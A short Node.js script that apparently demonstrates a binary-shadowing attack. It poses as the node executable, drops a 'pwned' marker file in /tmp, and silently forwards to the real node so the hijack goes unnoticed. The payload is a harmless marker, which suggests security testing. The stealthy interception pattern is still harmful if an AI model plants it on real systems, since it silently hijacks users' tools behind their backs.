#!/usr/bin/env node
const fs = require('fs');
fs.writeFileSync('/tmp/PWN_BIN_SHADOW', 'pwned via bin shadow');
// Forward to real node so nothing breaks
const { execFileSync } = require('child_process');
try {
  execFileSync('/usr/bin/env', ['node.real', ...process.argv.slice(2)], { stdio: 'inherit' });
} catch(e) {}
